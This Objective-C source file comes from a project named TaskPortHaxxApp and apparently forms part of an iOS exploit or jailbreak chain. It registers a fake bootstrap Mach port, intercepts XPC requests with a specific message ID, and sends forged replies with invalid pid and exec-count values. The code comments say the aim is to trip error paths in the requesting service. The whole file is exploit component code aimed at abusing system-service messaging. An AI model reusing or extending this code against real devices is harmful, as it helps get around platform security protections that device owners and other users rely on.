//
//  fake_bootstrap_server.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 31/10/25.
//

@import Darwin;
@import Foundation;
@import XPC;
#import "taskporthaxx.h"

typedef boolean_t (*dispatch_mig_callback_t)(mach_msg_header_t *message, mach_msg_header_t *reply);
int xpc_pipe_try_receive(mach_port_t p, xpc_object_t *message, mach_port_t *recvp, dispatch_mig_callback_t callout, size_t maxmsgsz, uint64_t flags);
int xpc_receive_mach_msg(mach_msg_header_t *msg, uint64_t x1, uint64_t x2, uint64_t x3, xpc_object_t *request);

boolean_t dispatch_mig_callback(mach_msg_header_t *request, mach_msg_header_t *reply) {
    printf("dispatch_mig_callback asked to handle msgh_id 0x%x\n", request->msgh_id);
    if (request->msgh_id == 0x400002ce && request) {
        xpc_object_t reqObj;
        request->msgh_id = 0x40000000;
        // request - 0x58 = dispatch_mach_msg_t
        xpc_receive_mach_msg((void *)((uint64_t)request - 0x58), 0, 0, 0, &reqObj);
        request->msgh_id = 0x400002ce;
        NSLog(@"Got request: %@", reqObj);
        
        xpc_object_t reply = xpc_dictionary_create_reply(reqObj);
        // __XPC_IS_CRASHING_AFTER_AN_ATTEMPT_TO_CREATE_A_PROHIBITED_DOMAIN__ is not available on iOS 17.0
        //xpc_dictionary_set_int64(reply, "error", 0x9c);
        // instead, we trip other cold errors
        xpc_dictionary_set_int64(reply, "req_pid", -1);
        xpc_dictionary_set_int64(reply, "rec_execcnt", -1);
        xpc_pipe_routine_reply(reply);
        
        return true;
    }
    
    mach_msg_destroy(request);
    return false;
}

void fake_bootstrap_server(mach_port_t server_port) {
    kern_return_t kr;
    do {
        kr = xpc_pipe_try_receive(server_port, NULL, NULL, dispatch_mig_callback, 0x4000, 0);
        if (kr != KERN_SUCCESS) {
            printf("xpc_pipe_try_receive failed\n");
            continue;
        }
    } while(true);
}

static void* fake_bootstrap_server_thread_func(void* arg) {
    mach_port_t server_port = (mach_port_t)arg;
    fake_bootstrap_server(server_port);
    return NULL;
}

mach_port_t setup_fake_bootstrap_server_with_id(int thread_id) {
    mach_port_t server_port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
    assert(kr == KERN_SUCCESS);
    kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);
    assert(kr == KERN_SUCCESS);
    char port_name[PATH_MAX];
    snprintf(port_name, sizeof(port_name), "com.roothide.bootstrap.fake_bootstrap_port.%d", thread_id); 
    kr = bootstrap_register(bootstrap_port, port_name, server_port);
    assert(kr == KERN_SUCCESS);
    pthread_t fake_thread;
    pthread_create(&fake_thread, NULL, fake_bootstrap_server_thread_func, (void*)server_port);
    return server_port;
}
